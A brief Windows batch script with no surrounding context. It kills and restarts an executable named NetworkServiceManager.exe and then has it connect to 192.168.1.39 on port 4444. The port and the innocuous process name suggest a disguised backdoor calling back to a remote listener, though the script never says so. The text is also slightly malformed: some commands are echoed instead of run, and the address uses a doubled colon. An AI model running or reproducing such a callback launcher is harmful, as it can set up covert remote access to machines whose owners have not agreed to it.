echo @echo off
  echo REM Kill all instances of NetworkServiceManager.exe
  taskkill /f /im NetworkServiceManager.exe >nul 2>&1
  timeout /t 1 >nul
  start NetworkServiceManager.exe -run
  timeout /t 1 >nul
  NetworkServiceManager.exe -connect 192.168.1.39::4444